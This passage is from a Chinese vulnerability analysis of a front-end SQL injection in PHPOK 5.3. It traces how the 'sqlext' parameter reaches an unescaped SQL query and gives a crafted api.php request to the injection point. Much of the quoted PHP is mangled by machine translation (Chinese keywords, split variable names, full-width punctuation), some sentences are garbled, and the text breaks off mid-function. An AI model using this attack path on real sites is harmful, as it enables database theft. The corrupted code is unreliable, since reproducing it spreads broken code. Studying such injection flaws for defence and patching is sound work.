&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">默认值：</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg = str_replace</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; \\&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&ldquo;&#39;&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&ldquo;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo; &lt;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;&gt;&ldquo;</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">＆＃</span><span class="cs9FB05234">92;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">＆＃</span><span class="cs9FB05234">39;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">quot; &ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">lt;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">＆</span><span class="cs9FB05234">gt;&ldquo;</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ msg =</span><span class="cs7FFD2630">加上斜线（</span><span class="cs9FB05234">$ msg</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ msg; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">格式默认为安全模式，也就是仅将</span><span class="cs8926E06">\ &quot; &#39; &lt; &gt;</span><span class="cs9C1B1871">实体编码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">注入点：</span></p><p class="cs40DD2BC9"><span class="cs8926E06">framework / api / index_control.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">phpok_f</span></p><p class="cs3A447A38"><span class="cs9FB05234">// ... </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ token = $ this-&gt; get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo; token&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ token</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; json</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">P_Lang</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo;</span><span class="cs7FFD2630">接口数据异常</span><span class="cs9FB05234">&rdquo;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">;; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;token&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; keyid</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; site [&#39;api_code&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ info = $ this-&gt; lib</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;token&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; decode</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ token</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ info</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; json</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">P_Lang</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">信息为空</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ id = $ info [&#39;id&#39;];</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// 176</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ ext = $ this-&gt; get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;ext&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ ext &amp;&amp; is_array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ ext</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ ext as $ key =&gt; $ value</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（！</span><span class="cs9FB05234">$ value</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">继续；</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// sqlext</span><span class="cs7FFD2630">变量转义取消</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ key ==&#39;sqlext&#39;&amp;&amp; $ value</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ value = str_replace</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">＆＃</span><span class="cs9FB05234">39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&ldquo;&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&rsquo;&#39;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;</span><span class="cs7FFD2630">＆＃</span><span class="cs9FB05234">34 ;&#39;</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">array</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&ldquo;&#39;&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&ldquo;&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&rdquo;&#39;&ldquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;&rdquo;&#39;</span><span class="cs7FFD2630">），</span><span class="cs9FB05234">$ value</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ param [$ key] = $ value; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// $ id</span><span class="cs7FFD2630">从加密的令牌中来</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/// sqlsql</span><span class="cs7FFD2630">的值的函数只有</span><span class="cs9FB05234">_userlist</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">_arc_condition_single</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">_arc_condition </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ list = $ this-&gt; call-&gt; phpok</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ param</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继续跟进</span><span class="cs8926E06">phpok</span><span class="cs9C1B1871">函数：</span><span class="cs8926E06">framework / phpok_call.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">phpok</span></p><p class="cs3A447A38"><span class="cs7FFD2630">公共功能</span><span class="cs9FB05234">phpok</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ rs =&ldquo;&rdquo;</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 76</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ siteinfo = $ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;site&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; get_one</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ rs [&#39;site&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 91</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">substr</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">0,1</span><span class="cs7FFD2630">）！</span><span class="cs9FB05234">=&#39;_&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// $ id</span><span class="cs7FFD2630">从令牌中来，为</span><span class="cs9FB05234">phpok</span><span class="cs7FFD2630">表中</span><span class="cs9FB05234">identifier</span><span class="cs7FFD2630">标识符，</span><span class="cs9FB05234">$ rs [&#39;site&#39;]</span><span class="cs7FFD2630">可控为任意值</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ call_rs = $ this-&gt; load_phpoklist</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ rs [&#39;site&#39;]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 116</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ func =&#39;_&#39;</span><span class="cs7FFD2630">。</span><span class="cs9FB05234">$ call_rs [&#39;type_id&#39;]; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 131</span><span class="cs7FFD2630">行动态调用函数</span><span class="cs9FB05234">_xxxx </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">this- &gt; $ func</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ call_rs</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ cache_id</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; }</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">load_phpoklist</span><span class="cs9C1B1871">：</span><span class="cs8926E06">framework / phpok_call.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">load_phpoklist</span></p><p class="cs3A447A38"><span class="cs7FFD2630">私有函数</span><span class="cs9FB05234">load_phpoklist</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ id</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ siteid = 0</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;call&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; site_id</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ siteid</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; _ cache &amp;&amp; $ this-&gt; _ cache [$ id]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ this-&gt; _ cache [$ id]; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ this-&gt; _ cache = $ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;call&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; all</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ siteid</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;identifier&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; _ cache &amp;&amp; $ this-&gt; _ cache [$ id]</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ this-&gt; _ cache [$ id]; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这一段代码</span><span class="cs8926E06">$this-&gt;model(&#39;call&#39;)-&gt;all($siteid,&#39;identifier&#39;);</span><span class="cs9C1B1871">实现的是查询</span><span class="cs8926E06">phpok</span><span class="cs9C1B1871">表，其中</span><span class="cs8926E06">identifier = xxx</span><span class="cs9C1B1871">的信息，然后在</span><span class="cs8926E06">phpok()</span><span class="cs9C1B1871">函数的</span><span class="cs8926E06">131</span><span class="cs9C1B1871">行进行动态调用其插入为</span><span class="cs8926E06">type_id</span><span class="cs9C1B1871">的值函数。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PHPOK/PHPOK%205.3%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="244" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">例如我们要调用</span><span class="cs8926E06">framework/phpok_call.php</span><span class="cs9C1B1871">下的</span><span class="cs8926E06">_arclist</span><span class="cs9C1B1871">函数，我们可以选择：</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/api.php?c=index&amp;f=phpok&amp;ext[site]=1&amp;token=</span><span class="cs7FFD2630">加密</span><span class="cs9FB05234">(&#39;id=m_picplayer&#39;)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们接着在</span><span class="cs8926E06">framework/phpok_call.php</span><span class="cs9C1B1871">电子邮件寻找柯林斯触发</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">的函数，从</span><span class="cs8926E06">phpok</span><span class="cs9C1B1871">表里我们可以看到其默认的</span><span class="cs8926E06">TYPE_ID</span><span class="cs9C1B1871">只有四个不同的值</span><span class="cs8926E06">arclist</span><span class="cs9C1B1871">，</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，</span><span class="cs8926E06">arc</span><span class="cs9C1B1871">，</span><span class="cs8926E06">catelist</span><span class="cs9C1B1871">，</span><span class="cs8926E06">project</span><span class="cs9C1B1871">我们而需要找到拼接</span><span class="cs8926E06">sqlext</span><span class="cs9C1B1871">变量的函数：</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">框架</span><span class="cs8926E06">/ phpok_call.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">_arclist</span></p><p class="cs3A447A38"><span class="cs7FFD2630">私有函数</span><span class="cs9FB05234">_arclist</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ rs</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ cache_id =&#39;&#39;</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 254</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ condition = $ this-&gt; _ arc_condition</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ rs</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ flist</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ project</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">带入注入数据</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ array [&#39;total&#39;] = $ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;list&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; arc_count</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ project [&#39;module&#39;]</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ condition</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进：</span><span class="cs8926E06">framework / phpok_call.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">_arc_condition</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">直接拼接了</span><span class="cs8926E06">sqlext</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function _arc_condition($rs,$fields=&#39;&#39;,$project=&#39;&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 623</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($rs[&#39;sqlext&#39;]){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$condition .= &quot; AND &quot;.$rs[&#39;sqlext&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// 671</span><span class="cs7FFD2630">行</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return $condition;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">接着将结果带入了：</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ this-&gt; model</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;list&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">-&gt; arc_count</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ project [&#39;module&#39;]</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ condition</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">调用：</span><span class="cs8926E06">framework / model / list.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">arc_count 5.jpg</span></p><p class="cs40DD2BC9"><span><img src="Web安全/PHPOK/PHPOK%205.3%20%e5%89%8d%e5%8f%b0%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="235" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">拼接</span><span class="cs8926E06">sql</span><span class="cs9C1B1871">，调用</span><span class="cs8926E06">$this-&gt;db-&gt;count($sql)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">framework / engine / db / mysqli.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">count</span></p><p class="cs3A447A38"><span class="cs7FFD2630">公共功能计数（</span><span class="cs9FB05234">$ sql =&ldquo;&rdquo;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">$ is_count = true</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql &amp;&amp; is_string</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">&amp;&amp; $ is_count</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; set</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;type&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;num&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ rs = $ this-&gt; get_one</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; set</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">&#39;type&#39;</span><span class="cs7FFD2630">，</span><span class="cs9FB05234">&#39;assoc&#39;</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">$ rs [0]; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} else { </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql &amp;&amp; is_string</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ this-&gt; query</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; query</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">mysqli_num_rows</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; query</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根进</span><span class="cs8926E06">get_one</span><span class="cs9C1B1871">函数：</span><span class="cs8926E06">framework / engine / db / mysqli.php</span><span class="cs9C1B1871">＃</span><span class="cs8926E06">get_one</span></p><p class="cs3A447A38"><span class="cs7FFD2630">公共功能</span><span class="cs9FB05234">get_one</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql =&#39;&#39;</span><span class="cs7FFD2630">）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ false = $ this-&gt; cache_false</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ false</span><span class="cs7FFD2630">）</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs7FFD2630">返回</span><span class="cs9FB05234">false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ this-&gt; cache_get</span><span class="cs7FFD2630">（</span><span class="cs9FB05234">$ sql</span><span class="cs7FFD2630">））</span><span class="cs9FB05234">{ </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 